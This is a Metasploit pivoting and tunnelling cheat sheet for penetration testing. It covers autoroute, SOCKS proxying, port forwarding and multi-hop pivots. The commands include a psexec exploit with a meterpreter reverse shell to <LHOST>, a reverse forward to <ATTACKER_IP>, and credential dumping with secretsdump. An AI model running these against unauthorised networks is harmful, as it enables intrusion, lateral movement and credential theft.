# Pivoting & Tunneling Guide (Metasploit)

## AutoRoute — The Foundation of All Pivoting

AutoRoute adds routing rules to Metasploit so that traffic destined for an internal
network is tunneled through a Meterpreter session automatically.

### Setup
```
# From within a Meterpreter session:
run autoroute -s <SUBNET>/<CIDR>
# Example: run autoroute -s 10.10.10.0/24

# Or from msfconsole:
use post/multi/manage/autoroute
set SESSION <ID>
set SUBNET <SUBNET>
set NETMASK 255.255.255.0
run
```

### Management
```
# Print routes
run autoroute -p

# Delete specific route
run autoroute -d -s <SUBNET>/<CIDR>

# Delete all routes
run autoroute -d
```

### What AutoRoute Enables
- All Metasploit modules (exploits, scanners, aux) can target the internal subnet
- SOCKS proxy through the pivot for external tools (proxychains)
- Port forwarding for specific services

---

## SOCKS Proxy (For External Tools)

### Setup SOCKS4a
```
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
set VERSION 4a
run -j
```

### Setup SOCKS5
```
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
set VERSION 5
run -j
```

### Configure Proxychains
```bash
# Edit /etc/proxychains4.conf:
# Comment out: proxy_dns
# Add at bottom:
# socks4 127.0.0.1 1080
# Or for SOCKS5:
# socks5 127.0.0.1 1080
```

### Use with External Tools
```bash
# Nmap (TCP connect scan only — no SYN through SOCKS)
proxychains nmap -sT -Pn -n <INTERNAL_TARGET>

# CrackMapExec
proxychains crackmapexec smb <INTERNAL_TARGET>

# Evil-WinRM
proxychains evil-winrm -i <INTERNAL_TARGET> -u admin -p password

# Impacket tools
proxychains impacket-psexec <DOMAIN>/<USER>:<PASS>@<INTERNAL_TARGET>
proxychains impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<INTERNAL_TARGET>

# SSH
proxychains ssh user@<INTERNAL_TARGET>

# RDP
proxychains xfreerdp /v:<INTERNAL_TARGET> /u:<USER> /p:<PASS>
```

---

## Port Forwarding

### Local Port Forward
Makes a remote service accessible on a local port.
```
# Syntax: portfwd add -l <local_port> -p <remote_port> -r <remote_host>

# RDP
portfwd add -l 3389 -p 3389 -r <TARGET>
# Access: rdesktop 127.0.0.1:3389

# SMB
portfwd add -l 445 -p 445 -r <TARGET>
# Access: smbclient //127.0.0.1/share -U user

# HTTP
portfwd add -l 8080 -p 80 -r <TARGET>
# Access: curl http://127.0.0.1:8080

# MSSQL
portfwd add -l 1433 -p 1433 -r <TARGET>
# Access: impacket-mssqlclient user:pass@127.0.0.1

# MySQL
portfwd add -l 3306 -p 3306 -r <TARGET>
# Access: mysql -h 127.0.0.1 -u root -p

# WinRM
portfwd add -l 5985 -p 5985 -r <TARGET>
# Access: evil-winrm -i 127.0.0.1 -u user -p pass
```

### Reverse Port Forward
Expose attacker services to the internal network.
```
# Make attacker's port 8443 accessible to internal hosts via pivot
portfwd add -R -l 8443 -p 8443 -L <ATTACKER_IP>
# Internal hosts can now reach <PIVOT_IP>:8443 → routes to attacker:8443
```

### Management
```
portfwd list          # List all forwards
portfwd delete -l <port> -p <port> -r <host>  # Remove specific
portfwd flush         # Remove all forwards
```

---

## Multi-Hop Pivoting

### Scenario: Attacker → DMZ (Session 1) → Internal (Session 2) → Secure Zone

```
# Step 1: Route DMZ subnet through Session 1
sessions -i 1
run autoroute -s 10.10.10.0/24
background

# Step 2: Exploit internal host through the route
use exploit/windows/smb/psexec
set RHOSTS 10.10.10.5
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <LHOST>
exploit
# → Session 2 opens

# Step 3: Route secure zone through Session 2
sessions -i 2
run autoroute -s 172.16.0.0/24
background

# Step 4: Start SOCKS proxy (routes through both hops automatically)
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
run -j

# Step 5: Use external tools through the double pivot
# proxychains nmap -sT -Pn 172.16.0.10
```

---

## Troubleshooting

| Issue | Solution |
|-------|----------|
| Route not working | Verify `run autoroute -p` shows the route; check session is alive |
| SOCKS connection refused | Verify socks_proxy is running (`jobs`); check SRVHOST is 127.0.0.1 |
| Proxychains DNS timeout | Use IP addresses, or ensure `proxy_dns` is commented in proxychains.conf |
| Nmap through SOCKS | Must use `-sT` (TCP connect), `-Pn` (no ping), `-n` (no DNS) |
| Port forward stale | `portfwd flush` and re-add; session may have died |
| Multi-hop latency | Expected — add timeouts to tools; use `-T2` for nmap |
